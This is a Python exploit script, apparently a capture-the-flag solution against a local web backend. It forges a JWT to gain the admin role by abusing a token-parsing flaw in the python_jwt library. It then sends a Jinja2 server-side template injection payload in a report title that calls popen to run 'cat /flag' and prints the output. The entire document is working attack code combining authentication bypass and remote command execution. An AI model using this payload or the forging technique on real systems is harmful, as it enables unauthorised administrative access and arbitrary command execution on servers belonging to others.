import requests
from json import *
from python_jwt import *
from jwcrypto import jwk

BACKEND_URL = "http://localhost:12333"

jwt = requests.post(f"{BACKEND_URL}/login", json={
    "username": "guest",
    "password": "guest"
}).json()["token"]

[header, payload, signature] = jwt.split('.')
parsed_payload = loads(base64url_decode(payload))
parsed_payload['role'] = "admin"
fake = base64url_encode(dumps(parsed_payload))
token = '{" ' + header + '.' + fake + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'

flag = requests.post(f"{BACKEND_URL}/api/report/generate", headers={
    "Authorization": f"Bearer {token}"
}, json={
    "company_id": 1,
    "title": "{{ ''.__class__.__base__.__subclasses__()[156].__init__.__globals__['popen']('cat /flag').read() }}",
    "template": "{% set a=1 %}"
}).json()["report_html"][42:].split("</title>")[0]

print(flag)